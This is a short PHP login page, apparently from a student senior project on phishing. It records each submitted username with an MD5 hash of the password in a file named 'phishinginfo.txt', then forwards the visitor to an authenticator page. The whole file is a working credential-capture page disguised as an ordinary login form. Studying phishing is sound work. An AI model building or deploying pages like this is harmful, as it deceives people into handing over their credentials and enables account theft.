<?php



require 'log.php';

$log=new logging();
$log->lfile('C:\MAMP\htdocs\SeniorProject\phishinginfo.txt');

if (isset($_POST['username']) & isset($_POST['password'])) {
   $log->lwrite("username : " .$_POST['username'] . " password : " . md5($_POST['password']));
   header("Location: authenticator.php");

}

?>

<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Login Page</title>
<link rel="stylesheet" href="css/bootstrap.min.css">
</head>
<body>

<h1>Login</h1>
<form action="login.php" method="post">
<p>Username:<input type="text" name="username" /></p>
<p>Password:<input type="password" name="password" /></p>
<p><input type="submit" value="Login"/></p>
</form>
           
<p>Not Registered Yet? <a href="registration.php">Register Here</a></p>
          
</body>
</html>